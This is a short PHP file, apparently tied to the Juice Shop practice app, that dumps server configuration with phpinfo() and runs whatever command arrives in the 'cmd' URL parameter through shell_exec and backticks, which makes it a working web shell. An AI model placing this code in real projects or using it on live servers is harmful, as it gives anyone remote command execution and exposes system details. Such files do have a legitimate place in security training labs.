<?php

phpinfo();
phpinfo();

shell_exec($_GET['cmd'] ?? 'ls -la');
$cmd = $_GET['cmd'] ?? 'ls -la';
`$cmd`;

echo "Hello, Juice Shop!";